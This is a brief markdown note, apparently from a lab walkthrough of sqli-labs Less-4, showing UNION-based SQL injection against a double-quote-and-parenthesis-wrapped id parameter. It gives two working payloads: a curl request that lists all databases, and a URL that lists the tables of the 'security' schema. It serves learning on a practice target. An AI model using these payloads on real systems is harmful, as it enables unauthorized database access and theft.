# SQL Injection - DBL Quotes String Based
Below is syntax that can be tested for SQL Injection of a integer that is wrapped in double quotes and parenthesis.
## Listsing Databases
```
curl http://(TARGET IP ADDRESS)/sqli-labs/Less-4/?id=3")\
 union select 1,2,\
  group_concat(distinct table_schema separator ',') \
   from information_schema.tables LIMIT 1,1 -- -
```
This will list all of the databases available.
## Listing Tables
Below is syntax that can be used to list the tables of a given database name,
```
http://(TARGET IP ADDRESS)/sqli-labs/Less-4/?id=3")\
 union select 1,2,\
  group_concat(distinct table_name separator ',')\
   from information_schema.tables where table_schema = 'security' LIMIT 1,1 -- -
```
